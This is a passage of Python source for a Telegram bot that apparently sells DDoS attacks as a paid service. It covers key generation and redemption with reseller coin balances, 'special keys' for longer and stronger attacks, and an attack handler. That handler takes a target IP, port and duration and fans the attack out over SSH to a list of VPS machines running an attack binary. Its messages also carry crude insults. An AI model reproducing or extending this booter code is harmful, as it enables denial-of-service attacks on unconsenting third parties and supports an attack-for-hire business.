    await update.message.reply_text(message, parse_mode='Markdown')

async def remove_bot_instance(update: Update, context: CallbackContext):
    """Remove a bot instance"""
    if not is_owner(update):
        await update.message.reply_text("❌ Only owner can remove bot instances!", parse_mode='Markdown')
        return
    
    configs = load_bot_configs()
    if not configs:
        await update.message.reply_text("ℹ️ No bot instances configured!", parse_mode='Markdown')
        return
    
    bot_list = "\n".join(
        f"{i}. Owner: @{c['owner_username']} ({'🟢 Running' if c.get('active') else '🔴 Stopped'})"
        for i, c in enumerate(configs)
    )
    
    await update.message.reply_text(
        f"⚠️ Select bot to remove by number:\n\n{bot_list}",
        parse_mode='Markdown'
    )
    return SELECT_BOT_TO_STOP

async def remove_bot_selection(update: Update, context: CallbackContext):
    try:
        selection = int(update.message.text)
        configs = load_bot_configs()
        
        if 0 <= selection < len(configs):
            config = configs.pop(selection)
            save_bot_configs(configs)
            
            # Stop the bot if running
            if config['token'] in BOT_INSTANCES:
                process = BOT_INSTANCES[config['token']]
                process.terminate()
                try:
                    process.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    process.kill()
                del BOT_INSTANCES[config['token']]
            
            # Remove data directory
            try:
                if os.path.exists(config['data_dir']):
                    import shutil
                    shutil.rmtree(config['data_dir'])
            except Exception as e:
                logging.error(f"Error removing bot data directory: {e}")
            
            await update.message.reply_text(
                f"✅ Bot instance {selection} removed successfully!",
                parse_mode='Markdown'
            )
        else:
            await update.message.reply_text("❌ Invalid selection!", parse_mode='Markdown')
    except ValueError:
        await update.message.reply_text("❌ Please enter a valid number!", parse_mode='Markdown')
    
    return ConversationHandler.END

async def start_selected_bot(update: Update, context: CallbackContext):
    """Start a selected bot instance"""
    if not is_owner(update):
        await update.message.reply_text("❌ Only owner can start bot instances!", parse_mode='Markdown')
        return
    
    configs = load_bot_configs()
    if not configs:
        await update.message.reply_text("ℹ️ No bot instances configured!", parse_mode='Markdown')
        return
    
    bot_list = "\n".join(
        f"{i}. Owner: @{c['owner_username']} ({'🟢 Running' if c.get('active') else '🔴 Stopped'})"
        for i, c in enumerate(configs)
    )
    
    await update.message.reply_text(
        f"⚠️ Select bot to start by number:\n\n{bot_list}",
        parse_mode='Markdown'
    )
    return SELECT_BOT_TO_START

async def start_bot_selection(update: Update, context: CallbackContext):
    try:
        selection = int(update.message.text)
        configs = load_bot_configs()
        
        if 0 <= selection < len(configs):
            config = configs[selection]
            
            if config.get('active'):
                await update.message.reply_text("ℹ️ This bot is already running!", parse_mode='Markdown')
                return ConversationHandler.END
                
            # Start the bot instance
            process = subprocess.Popen(
                [sys.executable, str(Path(__file__).resolve()), "--token", config['token'], "--owner", config['owner_username']],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            BOT_INSTANCES[config['token']] = process
            config['active'] = True
            save_bot_configs(configs)
            
            await update.message.reply_text(
                f"✅ Bot instance {selection} started successfully!",
                parse_mode='Markdown'
            )
        else:
            await update.message.reply_text("❌ Invalid selection!", parse_mode='Markdown')
    except ValueError:
        await update.message.reply_text("❌ Please enter a valid number!", parse_mode='Markdown')
    
    return ConversationHandler.END

async def stop_selected_bot(update: Update, context: CallbackContext):
    """Stop a selected bot instance"""
    if not is_owner(update):
        await update.message.reply_text("❌ Only owner can stop bot instances!", parse_mode='Markdown')
        return
    
    configs = load_bot_configs()
    if not configs:
        await update.message.reply_text("ℹ️ No bot instances configured!", parse_mode='Markdown')
        return
    
    bot_list = "\n".join(
        f"{i}. Owner: @{c['owner_username']} ({'🟢 Running' if c.get('active') else '🔴 Stopped'})"
        for i, c in enumerate(configs))
    
    await update.message.reply_text(
        f"⚠️ Select bot to stop by number:\n\n{bot_list}",
        parse_mode='Markdown'
    )
    return SELECT_BOT_TO_STOP



async def stop_bot_selection(update: Update, context: CallbackContext):
    try:
        selection = int(update.message.text)
        configs = load_bot_configs()
        
        if 0 <= selection < len(configs):
            config = configs[selection]
            
            if not config.get('active'):
                await update.message.reply_text("ℹ️ This bot is already stopped!", parse_mode='Markdown')
                return ConversationHandler.END
                
            # Stop the bot instance
            if config['token'] in BOT_INSTANCES:
                process = BOT_INSTANCES[config['token']]
                process.terminate()
                try:
                    process.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    process.kill()
                del BOT_INSTANCES[config['token']]
            
            config['active'] = False
            save_bot_configs(configs)
            
            await update.message.reply_text(
                f"✅ Bot instance {selection} stopped successfully!",
                parse_mode='Markdown'
            )
        else:
            await update.message.reply_text("❌ Invalid selection!", parse_mode='Markdown')
    except ValueError:
        await update.message.reply_text("❌ Please enter a valid number!", parse_mode='Markdown')
    
    return ConversationHandler.END

async def show_bot_list_cmd(update: Update, context: CallbackContext):
    """Show list of configured bot instances"""
    if not is_owner(update):
        await update.message.reply_text("❌ Only owner can view bot instances!", parse_mode='Markdown')
        return
    
    configs = load_bot_configs()
    
    if not configs:
        await update.message.reply_text(
            "ℹ️ No bot instances configured yet!",
            parse_mode='Markdown'
        )
        return
    
    message = "📋 Configured Bot Instances:\n\n"
    for i, config in enumerate(configs):
        status = "🟢 Running" if config.get('active', False) else "🔴 Stopped"
        message += (
            f"{i}. Owner: @{config['owner_username']}\n"
            f"   Status: {status}\n"
            f"   Token: `{config['token'][:10]}...`\n"
            f"   Data Dir: `{config.get('data_dir', 'N/A')}`\n\n"
        )
    
    await update.message.reply_text(
        message,
        parse_mode='Markdown'
    )

async def manual_key_generation(update: Update, context: CallbackContext):
    if not (is_owner(update) or is_co_owner(update) or is_reseller(update)):
        await update.message.reply_text("❌ You are not allowed to generate keys.")
        return

    args = context.args
    if not args:
        await update.message.reply_text("❌ Usage: /code <duration>\nExamples: /code 1h or /code 2d")
        return

    raw_input = args[0].lower()

    # Determine duration in seconds
    if raw_input.endswith("h"):
        try:
            amount = int(raw_input[:-1])
            duration_str = f"{amount}H"
            duration_seconds = amount * 3600
        except ValueError:
            await update.message.reply_text("❌ Invalid hour format. Example: /code 2h")
            return
    elif raw_input.endswith("d"):
        try:
            amount = int(raw_input[:-1])
            duration_str = f"{amount}D"
            duration_seconds = amount * 86400
        except ValueError:
            await update.message.reply_text("❌ Invalid day format. Example: /code 3d")
            return
    else:
        # Default to days if no suffix is provided
        try:
            amount = int(raw_input)
            duration_str = f"{amount}D"
            duration_seconds = amount * 86400
        except ValueError:
            await update.message.reply_text("❌ Invalid input. Use something like /code 1h or /code 3d")
            return

    user_id = update.effective_user.id
    price = KEY_PRICES.get(duration_str)

    if is_reseller(update):
        if not price:
            await update.message.reply_text(f"❌ No price configured for {duration_str}")
            return
        if user_id not in reseller_balances or reseller_balances[user_id] < price:
            await update.message.reply_text(f"❌ You need {price} coins to generate this key.")
            return
        reseller_balances[user_id] -= price

    unique_key = os.urandom(4).hex().upper()
    key = f"{OWNER_USERNAME}-{duration_str}-{unique_key}"

    keys[key] = {
        'expiration_time': time.time() + duration_seconds,
        'generated_by': user_id
    }

    save_keys()

    await update.message.reply_text(
        f"✅ Key generated:\n\n🔑 `{key}`\n⏳ Valid for {duration_str}",
        parse_mode='Markdown'
    )
                                                                                                                                                                   
                                                                                                                                                                                                                                    
async def open_bot(update: Update, context: CallbackContext):
    if not (is_owner(update) or is_co_owner(update)):
        await update.message.reply_text("❌ *Only the owner or co-owners can use this command!*", parse_mode='Markdown')
        return
    
    global bot_open
    bot_open = True
    await update.message.reply_text(
        "✅ *Bot opened! Users can now attack for 120 seconds without keys.*\n"
        f"🔑 *For 200 seconds attacks, keys are still required. Buy from *",
        parse_mode='Markdown'
    )

async def close_bot(update: Update, context: CallbackContext):
    if not (is_owner(update) or is_co_owner(update)):
        await update.message.reply_text("❌ *Only the owner or co-owners can use this command!*", parse_mode='Markdown')
        return
    
    global bot_open
    bot_open = False
    await update.message.reply_text(
        "✅ *Bot closed! Users now need keys for all attacks.*\n",
        parse_mode='Markdown'
    )

async def start(update: Update, context: CallbackContext):
    chat = update.effective_chat
    user = update.effective_user
    image = get_random_start_image()

    # ✅ Properly indented user tracking
    if 'users_interacted' not in context.bot_data:
        context.bot_data['users_interacted'] = set()
    context.bot_data['users_interacted'].add(user.id)

    
    modified_caption = (
        f"{image['caption']}\n\n"
    )
    
    if chat.type == "private":
        if not is_authorized_user(update):
            await update.message.reply_photo(
                photo=image['url'],
                caption=f"❌ *This bot is not authorized to use here.*\n\n",
                parse_mode='Markdown'
            )
            return

        if is_owner(update):
            await update.message.reply_photo(
                photo=image['url'],
                caption=modified_caption,
                parse_mode='Markdown',
                reply_markup=owner_markup
            )
        elif is_co_owner(update):
            await update.message.reply_photo(
                photo=image['url'],
                caption=modified_caption,
                parse_mode='Markdown',
                reply_markup=co_owner_markup
            )
        else:
            await update.message.reply_photo(
                photo=image['url'],
                caption=modified_caption,
                parse_mode='Markdown',
                reply_markup=reseller_markup
            )
        return

    if not is_allowed_group(update):
        return

    await update.message.reply_photo(
        photo=image['url'],
        caption=modified_caption,
        parse_mode='Markdown',
        reply_markup=group_user_markup
    )

async def generate_key_start(update: Update, context: CallbackContext):
    if not (is_owner(update) or is_co_owner(update) or is_reseller(update)):
        await update.message.reply_text("❌ *Only the owner, co-owners or resellers can generate keys!*", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text("⚠️ *Enter the duration for the key (e.g., 1H for 1 hour or 1D for 1 day).*", parse_mode='Markdown')
    return GET_DURATION

async def generate_key_duration(update: Update, context: CallbackContext):
    duration_str = update.message.text

    if duration_str not in KEY_PRICES:
        await update.message.reply_text("❌ *Invalid format! Use 1H, 1D, or 2D.*", parse_mode='Markdown')
        return ConversationHandler.END

    user_id = update.effective_user.id
    if is_reseller(update):
        price = KEY_PRICES[duration_str]
        if user_id not in reseller_balances or reseller_balances[user_id] < price:
            await update.message.reply_text(f"❌ *Insufficient balance! You need {price} coins to generate this key.*", parse_mode='Markdown')
            return ConversationHandler.END

    unique_key = os.urandom(4).hex().upper()
    key = f"{OWNER_USERNAME}-{duration_str}-{unique_key}"
    keys[key] = {
        'expiration_time': time.time() + (int(duration_str[:-1]) * 3600 if duration_str.endswith('H') else int(duration_str[:-1]) * 86400),
        'generated_by': user_id
    }

    if is_reseller(update):
        reseller_balances[user_id] -= KEY_PRICES[duration_str]

    save_keys()

    current_display_name = get_display_name_from_update(update)
    
    await update.message.reply_text(
        f"🔑 *Generated Key:* `{key}`\n\n"
        f"*This key is valid for {duration_str}.*\n\n",
        parse_mode='Markdown'
    )
    return ConversationHandler.END

async def generate_special_key_start(update: Update, context: CallbackContext):
    if not (is_owner(update) or is_co_owner(update) or is_reseller(update)):
        await update.message.reply_text("❌ *Only the owner, co-owners or resellers can generate special keys!*", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text(
        "⚠️ *Enter the duration for the special key in days (e.g., 7 for 7 days, 30 for 30 days):*",
        parse_mode='Markdown'
    )
    return GET_SPECIAL_KEY_DURATION

async def generate_special_key_duration(update: Update, context: CallbackContext):
    try:
        days = int(update.message.text)
        if days <= 0:
            await update.message.reply_text("❌ *Duration must be greater than 0!*", parse_mode='Markdown')
            return ConversationHandler.END
            
        if is_reseller(update):
            user_id = update.effective_user.id
            price = SPECIAL_KEY_PRICES.get(f"{days}D", 9999)
            if user_id not in reseller_balances or reseller_balances[user_id] < price:
                await update.message.reply_text(
                    f"❌ *Insufficient balance! You need {price} coins to generate this special key.*",
                    parse_mode='Markdown'
                )
                return ConversationHandler.END
            
        context.user_data['special_key_days'] = days
        await update.message.reply_text(
            "⚠️ *Enter the custom format for the special key (e.g., 'CHUTIYA-TU-HA' will create key 'SPECIAL-CHUTIYA-TU-HA-XXXX'):*",
            parse_mode='Markdown'
        )
        return GET_SPECIAL_KEY_FORMAT
    except ValueError:
        await update.message.reply_text("❌ *Invalid input! Please enter a number.*", parse_mode='Markdown')
        return ConversationHandler.END

async def generate_special_key_format(update: Update, context: CallbackContext):
    custom_format = update.message.text.strip().upper()
    days = context.user_data.get('special_key_days', 30)
    
    if is_reseller(update):
        user_id = update.effective_user.id
        price = SPECIAL_KEY_PRICES.get(f"{days}D", 9999)
        reseller_balances[user_id] -= price
    
    random_suffix = os.urandom(2).hex().upper()
    key = f"SPECIAL-{custom_format}-{random_suffix}"
    expiration_time = time.time() + (days * 86400)
    
    special_keys[key] = {
        'expiration_time': expiration_time,
        'generated_by': update.effective_user.id
    }
    
    save_keys()
    
    current_display_name = get_display_name_from_update(update)
    
    await update.message.reply_text(
        f"💎 *Special Key Generated!*\n\n"
        f"🔑 *Key:* `{key}`\n"
        f"⏳ *Duration:* {days} days\n"
        f"⚡ *Max Duration:* {SPECIAL_MAX_DURATION} sec\n"
        f"🧵 *Max Threads:* {SPECIAL_MAX_THREADS}\n\n"
        f"👑 *Bot Owner:* @SLAYER_OP7 \n\n"
        f"⚠️ *This key provides enhanced attack capabilities when you fucking raja mommy!*",
        parse_mode='Markdown'
    )
    return ConversationHandler.END

async def redeem_key_start(update: Update, context: CallbackContext):
    if not is_allowed_group(update):
        await update.message.reply_text("❌ *This command can only be used in the allowed group!*", parse_mode='Markdown')
        return ConversationHandler.END

    current_display_name = get_display_name(update.effective_chat.id)
    
    await update.message.reply_text(
        "⚠️ *Enter the key to redeem.*\n\n"
        f"🔑 *Buy keys from {current_display_name}*",
        parse_mode='Markdown'
    )
    return GET_KEY

async def redeem_key_input(update: Update, context: CallbackContext):
    key = update.message.text

    if key in keys and keys[key]['expiration_time'] > time.time():
        user_id = update.effective_user.id
        redeemed_users[user_id] = keys[key]['expiration_time']
        redeemed_keys_info[key] = {
            'redeemed_by': user_id,
            'generated_by': keys[key]['generated_by']
        }
        del keys[key]

        current_display_name = get_display_name(update.effective_chat.id)

        text = (
            f"✅ *Key redeemed successfully! You can now use the attack command for {key.split('-')[1]}.*\n\n"
            f"👑 *Bot Owner:* {current_display_name}"
        )
        escaped_text = escape_markdown(text, version=2)
        await update.message.reply_text(
            escaped_text,
            parse_mode='MarkdownV2'
        )

    elif key in special_keys and special_keys[key]['expiration_time'] > time.time():
        user_id = update.effective_user.id
        redeemed_users[user_id] = {
            'expiration_time': special_keys[key]['expiration_time'],
            'is_special': True
        }
        redeemed_keys_info[key] = {
            'redeemed_by': user_id,
            'generated_by': special_keys[key]['generated_by'],
            'is_special': True
        }
        del special_keys[key]

        current_display_name = get_display_name(update.effective_chat.id)

        text = (
            f"💎 *Special Key Redeemed!*\n\n"
            f"*You now have access to enhanced attacks:*\n"
            f"• Max Duration: {SPECIAL_MAX_DURATION} sec\n"
            f"• Max Threads: {SPECIAL_MAX_THREADS}\n\n"
            f"👑 *Bot Owner:* {current_display_name}\n\n"
            f"⚡ *Happy attacking and RAJA ki maka chut phaad do!*"
        )
        escaped_text = escape_markdown(text, version=2)
        await update.message.reply_text(
            escaped_text,
            parse_mode='MarkdownV2'
        )

    else:
        current_display_name = get_display_name(update.effective_chat.id)

        text = (
            f"❌ *Invalid or expired key!*\n\n"
            f"🔑 *Buy valid keys from {current_display_name}*"
        )
        escaped_text = escape_markdown(text, version=2)
        await update.message.reply_text(
            escaped_text,
            parse_mode='MarkdownV2'
        )

    save_keys()
    return ConversationHandler.END

async def attack_start(update: Update, context: CallbackContext):
    chat = update.effective_chat

    if chat.type == "private":
        if not is_authorized_user(update):
            await update.message.reply_text("❌ *This bot is not authorized to use here.*", parse_mode='Markdown')
            return ConversationHandler.END

    if not is_allowed_group(update):
        await update.message.reply_text("❌ *This command can only be used in the allowed group!*", parse_mode='Markdown')
        return ConversationHandler.END

    global last_attack_time, global_cooldown

    current_time = time.time()
    if current_time - last_attack_time < global_cooldown:
        remaining_cooldown = int(global_cooldown - (current_time - last_attack_time))
        current_display_name = get_display_name(update.effective_chat.id)
        
        await update.message.reply_text(
            f"❌ *Please wait! Cooldown is active. Remaining: {remaining_cooldown} seconds.*\n\n"
            f"👑 *Bot Owner:* {current_display_name}",
            parse_mode='Markdown'
        )
        return ConversationHandler.END

    user_id = update.effective_user.id

    # Fixed condition with proper parentheses
    user_has_access = False
    if bot_open:
        user_has_access = True
    elif user_id in redeemed_users:
        if isinstance(redeemed_users[user_id], dict):
            if redeemed_users[user_id].get('is_special', False):
                user_has_access = True
        elif isinstance(redeemed_users[user_id], (int, float)):
            user_has_access = True

    if user_has_access:
        current_display_name = get_display_name(update.effective_chat.id)
        
        await update.message.reply_text(
            "⚠️ *Enter the attack arguments: <ip> <port> <duration>*\n\n"
            f"ℹ️ *When bot is open, max duration is {max_duration} sec. For {SPECIAL_MAX_DURATION} sec, you need a key.*\n\n"
            f"🔑 *Buy keys from {current_display_name}*",
            parse_mode='Markdown'
        )
        return GET_ATTACK_ARGS
    else:
        current_display_name = get_display_name(update.effective_chat.id)
        
        await update.message.reply_text(
            "❌ *You need a valid key to start an attack!*\n\n"
            f"🔑 *Buy keys from {current_display_name}*",
            parse_mode='Markdown'
        )
        return ConversationHandler.END

async def attack_input(update: Update, context: CallbackContext):
    global last_attack_time, running_attacks

    args = update.message.text.split()
    if len(args) != 3:  # Now only 3 arguments (ip, port, duration)
        current_display_name = get_display_name_from_update(update)
        await update.message.reply_text(
            f"❌ *Invalid input! Please enter <ip> <port> <duration>*\n\n"
            f"👑 *Bot Owner:* {current_display_name}\n"
            f"💬 *Need a key for 200s? DM:* {current_display_name}",
            parse_mode='Markdown'
        )
        return ConversationHandler.END

    ip, port, duration = args  # Only 3 variables
    duration = int(duration)
    
    # Set default threads
    user_id = update.effective_user.id
    is_special = False
    threads = MAX_THREADS  # Default threads for normal users
    
    if user_id in redeemed_users:
        if isinstance(redeemed_users[user_id], dict) and redeemed_users[user_id].get('is_special'):
            is_special = True
            threads = SPECIAL_MAX_THREADS  # Default threads for special key users
    
    if duration > max_duration and not is_special:
        current_display_name = get_display_name_from_update(update)
        await update.message.reply_text(
            f"❌ *Attack duration exceeds 120 seconds!*\n"
            f"🔑 *For 200 seconds attacks, you need a special key.*\n\n"
            f"👑 *Buy keys from:* {current_display_name}",
            parse_mode='Markdown'
        )
        return ConversationHandler.END

    max_allowed_duration = SPECIAL_MAX_DURATION if is_special else max_duration

    if duration > max_allowed_duration:
        current_display_name = get_display_name_from_update(update)
        await update.message.reply_text(
            f"❌ *Attack duration exceeds the max limit ({max_allowed_duration} sec)!*\n\n"
            f"👑 *Bot Owner:* {current_display_name}",
            parse_mode='Markdown'
        )
        return ConversationHandler.END

    last_attack_time = time.time()
    
    # Calculate threads per VPS
    total_vps = len(VPS_LIST)
    if total_vps == 0:
        await update.message.reply_text("❌ No VPS available for attack!", parse_mode='Markdown')
        return ConversationHandler.END
        
    threads_per_vps = threads // total_vps
    remaining_threads = threads % total_vps
    
    attack_id = f"{ip}:{port}-{time.time()}"
    
    attack_type = "⚡ *SPECIAL ATTACK* ⚡" if is_special else "⚔️ *Attack Started!*"
    current_display_name = get_display_name_from_update(update)
    
    # Send attack started message
    start_message = await update.message.reply_text(
        f"{attack_type}\n"
        f"🎯 *Target*: {ip}:{port}\n"
        f"🕒 *Duration*: {duration} sec\n"
        f"🧵 *Total Power*: {threads} threads\n"
        f"👑 *Bot Owner:* {current_display_name}\n\n"
        f"🔥 *ATTACK STARTED! /running * 💥",
        parse_mode='Markdown'
    )

    def _run_ssh_attack(vps, threads_for_vps, attack_num, context):
        """Synchronous SSH attack function to be run in thread"""
        ip_vps, username, password = vps
        attack_id_vps = f"{attack_id}-{attack_num}"
        
        # Register this attack
        running_attacks[attack_id_vps] = {
            'user_id': user_id,
            'start_time': time.time(),
            'duration': duration,
            'is_special': is_special,
            'vps_ip': ip_vps
        }
        
        ssh = None
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip_vps, username=username, password=password, timeout=10)
            
            # Set keepalive to prevent connection drops
            transport = ssh.get_transport()
            transport.set_keepalive(30)
            
            command = f"{BINARY_PATH} {ip} {port} {duration} {threads_for_vps}"
            stdin, stdout, stderr = ssh.exec_command(command, timeout=60)
            
            # Wait for command to complete or timeout
            start_time = time.time()
            while time.time() - start_time < duration + 10:
                if stdout.channel.exit_status_ready():
                    break
                time.sleep(1)
            
            logging.info(f"Attack finished on VPS {ip_vps}")
            
        except Exception as e:
            logging.error(f"SSH error on {ip_vps}: {str(e)}")
        finally:
            if ssh:
                try:
                    ssh.close()
                except:
                    pass
            
            # Remove from running attacks when done
            if attack_id_vps in running_attacks:
                del running_attacks[attack_id_vps]
            
            # Check if all attacks for this target are done
            active_attacks = [aid for aid in running_attacks if aid.startswith(attack_id)]
            if not active_attacks:
                # All attacks finished for this target
                asyncio.run_coroutine_threadsafe(
                    context.bot.send_message(
                        chat_id=update.effective_chat.id,
                        text=f"✅ *Attack Finished!*\n"
                             f"🎯 *Target*: {ip}:{port}\n"
                             f"🕒 *Duration*: {duration} sec\n"
                             f"🧵 *Total Power*: {threads} threads\n"
                             f"👑 *Bot Owner:* {current_display_name}\n\n"
                             f"🔥 *ATTACK COMPLETED!*",
                        parse_mode='Markdown'
                    ),
                app_event_loop  # 👈 This must be passed or set globally
                )

    try:
        # Start a thread for each VPS
        for i, vps in enumerate(VPS_LIST[:ACTIVE_VPS_COUNT]):
            threads_for_vps = threads_per_vps + (1 if i < remaining_threads else 0)
            if threads_for_vps > 0:
                threading.Thread(
                    target=_run_ssh_attack,
                    args=(vps, threads_for_vps, i, context),
                    daemon=True
                ).start()
        
    except Exception as e:
        logging.error(f"Error starting attack threads: {str(e)}")
        await update.message.reply_text(
            f"❌ *Error starting attack!*\n"
            f"Error: {str(e)}\n\n"
            f"👑 *Bot Owner:* {current_display_name}",
            parse_mode='Markdown'
        )
    
    return ConversationHandler.END

async def set_cooldown_start(update: Update, context: CallbackContext):
    if not (is_owner(update) or is_co_owner(update)):
        await update.message.reply_text("❌ *Only the owner or co-owners can set cooldown!*", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text("⚠️ *Enter the global cooldown duration in seconds.*", parse_mode='Markdown')
    return GET_SET_COOLDOWN

async def set_cooldown_input(update: Update, context: CallbackContext):
    global global_cooldown

    try:
        global_cooldown = int(update.message.text)
        current_display_name = get_display_name_from_update(update)
        
        await update.message.reply_text(
            f"✅ *Global cooldown set to {global_cooldown} seconds!*\n\n",
            parse_mode='Markdown'
        )
    except ValueError:
        await update.message.reply_text("❌ *Invalid input! Please enter a number.*", parse_mode='Markdown')
        return ConversationHandler.END
    return ConversationHandler.END

async def show_keys(update: Update, context: CallbackContext):
    if not (is_owner(update) or is_co_owner(update) or is_reseller(update)):
        await update.message.reply_text("❌ *Only the owner, co-owners or resellers can view keys!*", parse_mode='Markdown')
        return

    current_time = time.time()
    active_keys = []
    active_special_keys = []
    redeemed_keys = []
    expired_keys = []

    for key, key_info in keys.items():
        if key_info['expiration_time'] > current_time:
            remaining_time = key_info['expiration_time'] - current_time
            hours = int(remaining_time // 3600)
            minutes = int((remaining_time % 3600) // 60)
            
            generated_by_username = "Unknown"
            if key_info['generated_by']:
                try:
                    chat = await context.bot.get_chat(key_info['generated_by'])
                    generated_by_username = escape_markdown(chat.username or "NoUsername", version=2) if chat.username else "NoUsername"
                except Exception:
                    generated_by_username = "Unknown"
                    
            active_keys.append(f"🔑 `{escape_markdown(key, version=2)}` (Generated by @{generated_by_username}, Expires in {hours}h {minutes}m)")
        else:
            expired_keys.append(f"🔑 `{escape_markdown(key, version=2)}` (Expired)")

    for key, key_info in special_keys.items():
        if key_info['expiration_time'] > current_time:
            remaining_time = key_info['expiration_time'] - current_time
            days = int(remaining_time // 86400)
            hours = int((remaining_time % 86400) // 3600)
            
            generated_by_username = "Unknown"
            if key_info['generated_by']:
                try:
                    chat = await context.bot.get_chat(key_info['generated_by'])
                    generated_by_username = escape_markdown(chat.username or "NoUsername", version=2) if chat.username else "NoUsername"
                except Exception:
                    generated_by_username = "Unknown"
                    
            active_special_keys.append(f"💎 `{escape_markdown(key, version=2)}` (Generated by @{generated_by_username}, Expires in {days}d {hours}h)")

    for key, key_info in redeemed_keys_info.items():
        if key_info['redeemed_by'] in redeemed_users:
            redeemed_by_username = "Unknown"
            generated_by_username = "Unknown"
            
            try:
                redeemed_chat = await context.bot.get_chat(key_info['redeemed_by'])
                redeemed_by_username = escape_markdown(redeemed_chat.username or "NoUsername", version=2) if redeemed_chat.username else "NoUsername"
                
                if key_info['generated_by']:
                    generated_chat = await context.bot.get_chat(key_info['generated_by'])
                    generated_by_username = escape_markdown(generated_chat.username or "NoUsername", version=2) if generated_chat.username else "NoUsername"
            except Exception:
                pass
            
            if 'is_special' in key_info and key_info['is_special']:
                redeemed_keys.append(f"💎 `{escape_markdown(key, version=2)}` (Generated by @{generated_by_username}, Redeemed by @{redeemed_by_username})")
            else:
                redeemed_keys.append(f"🔑 `{escape_markdown(key, version=2)}` (Generated by @{generated_by_username}, Redeemed by @{redeemed_by_username})")

    current_display_name = get_display_name_from_update(update)
    
    message = (
        "*🗝️ Active Regular Keys:*\n" + ("\n".join(active_keys) + "\n\n" if active_keys else "No active regular keys found.\n\n") +
        "*💎 Active Special Keys:*\n" + ("\n".join(active_special_keys) + "\n\n" if active_special_keys else "No active special keys found.\n\n") +
        "*🗝️ Redeemed Keys:*\n" + ("\n".join(redeemed_keys) + "\n\n" if redeemed_keys else "No redeemed keys found.\n\n") +
        "*🗝️ Expired Keys:*\n" + ("\n".join(expired_keys) if expired_keys else "No expired keys found.") +
        f"\n\n👑 *Bot Owner:* PAPA KA BOT"
    )

    await update.message.reply_text(message, parse_mode='Markdown')


async def redeem_key_manual(update: Update, context: CallbackContext):
    if not context.args:
        await update.message.reply_text("❌ Usage: /redeem <key>")
        return

    key = context.args[0].strip()
    user_id = update.effective_user.id
    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat else None)

    if key in keys and keys[key]['expiration_time'] > time.time():
        redeemed_users[user_id] = keys[key]['expiration_time']
        redeemed_keys_info[key] = {
            'redeemed_by': user_id,
            'generated_by': keys[key]['generated_by']
        }
        del keys[key]
        save_keys()

        await update.message.reply_text(
            f"✅ *Key redeemed successfully! You can now use the attack command for {key.split('-')[1]}.*\n\n"
            f"👑 *Bot Owner:* {current_display_name}",
            parse_mode='Markdown'
        )
    elif key in special_keys and special_keys[key]['expiration_time'] > time.time():
        redeemed_users[user_id] = {
            'expiration_time': special_keys[key]['expiration_time'],
            'is_special': True
        }
        redeemed_keys_info[key] = {
            'redeemed_by': user_id,
            'generated_by': special_keys[key]['generated_by'],
            'is_special': True
        }
        del special_keys[key]
        save_keys()

        await update.message.reply_text(
            f"💎 *Special Key Redeemed!*\n\n"
            f"• Max Duration: {SPECIAL_MAX_DURATION} sec\n"
            f"• Max Threads: {SPECIAL_MAX_THREADS}\n\n"
            f"👑 *Bot Owner:* {current_display_name}",
            parse_mode='Markdown'
        )
    else:
        await update.message.reply_text(
            f"❌ *Invalid or expired key!*\n\n"
            f"🔑 *Buy valid keys from {current_display_name}*",
            parse_mode='Markdown'
        )



async def set_duration_start(update: Update, context: CallbackContext):
    if not (is_owner(update) or is_co_owner(update)):
        await update.message.reply_text("❌ *Only the owner or co-owners can set max attack duration!*", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text("⚠️ *Enter the maximum attack duration in seconds.*", parse_mode='Markdown')
    return GET_SET_DURATION

async def track_new_chat(update: Update, context: CallbackContext):
    """Track when the bot is added to a new chat"""
    chat = update.effective_chat
    
    # Initialize bot_data if not present
    if 'private_chats' not in context.bot_data:
        context.bot_data['private_chats'] = set()
    if 'group_chats' not in context.bot_data:
        context.bot_data['group_chats'] = set()
    
    # Add to appropriate set
    if chat.type == 'private':
        context.bot_data['private_chats'].add(chat.id)
    elif chat.type in ['group', 'supergroup']:
        context.bot_data['group_chats'].add(chat.id)

async def track_left_chat(update: Update, context: CallbackContext):
    """Track when the bot is removed from a chat"""
    chat = update.effective_chat
    
    # Remove from appropriate set if present
    if 'private_chats' in context.bot_data and chat.id in context.bot_data['private_chats']:
        context.bot_data['private_chats'].remove(chat.id)
    if 'group_chats' in context.bot_data and chat.id in context.bot_data['group_chats']:
        context.bot_data['group_chats'].remove(chat.id)


async def set_duration_input(update: Update, context: CallbackContext):
    global max_duration
    try:
        max_duration = int(update.message.text)
        current_display_name = get_display_name_from_update(update)
        
        await update.message.reply_text(
            f"✅ *Maximum attack duration set to {max_duration} seconds!*\n\n",
            parse_mode='Markdown'
        )
    except ValueError:
        await update.message.reply_text("❌ *Invalid input! Please enter a number.*", parse_mode='Markdown')
        return ConversationHandler.END
    return ConversationHandler.END

async def set_threads_start(update: Update, context: CallbackContext):
    if not (is_owner(update) or is_co_owner(update)):
        await update.message.reply_text("❌ *Only the owner or co-owners can set max threads!*", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text("⚠️ *Enter the maximum number of threads.*", parse_mode='Markdown')
    return GET_SET_THREADS

async def set_threads_input(update: Update, context: CallbackContext):
    global MAX_THREADS
    try:
        MAX_THREADS = int(update.message.text)
        current_display_name = get_display_name_from_update(update)
        
        await update.message.reply_text(
            f"✅ *Maximum threads set to {MAX_THREADS}!*\n\n",
            parse_mode='Markdown'
        )
    except ValueError:
        await update.message.reply_text("❌ *Invalid input! Please enter a number.*", parse_mode='Markdown')
        return ConversationHandler.END
    return ConversationHandler.END

async def delete_key_start(update: Update, context: CallbackContext):
    if not (is_owner(update) or is_co_owner(update)):
        await update.message.reply_text("❌ *Only the owner or co-owners can delete keys!*", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text("⚠️ *Enter the key to delete.*", parse_mode='Markdown')
    return GET_DELETE_KEY

async def delete_key_input(update: Update, context: CallbackContext):
    key = update.message.text

    if key in keys:
        del keys[key]
        await update.message.reply_text(f"✅ *Key `{key}` deleted successfully!*", parse_mode='Markdown')
    elif key in special_keys:
        del special_keys[key]
